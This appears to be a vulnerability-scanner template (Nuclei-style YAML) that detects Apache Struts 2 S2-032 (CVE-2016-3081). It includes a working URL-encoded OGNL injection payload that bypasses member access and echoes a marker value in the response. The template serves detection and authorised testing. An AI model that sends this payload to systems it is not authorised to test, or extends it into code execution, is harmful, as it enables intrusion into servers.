id: local-struts2-s2-032-math

info:
  name: Struts2 S2-032 OGNL Injection via method: prefix (CVE-2016-3081)
  author: pentest-platform
  severity: critical
  description: |
    Apache Struts 2 S2-032 (CVE-2016-3081) OGNL injection via Dynamic Method Invocation.
    Safe math probe: 233*233=54289 printed in response body via getWriter().
  reference:
    - https://cwiki.apache.org/confluence/display/WW/S2-032
    - https://nvd.nist.gov/vuln/detail/CVE-2016-3081
  tags: safe-poc,struts2,s2-032,cve,cve2016,ognl,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(%23parameters.math%5B0%5D).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&math=54289"
      - "{{BaseURL}}/HelloWorld.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(%23parameters.math%5B0%5D).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&math=54289"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "54289"
      - type: status
        status:
          - 200
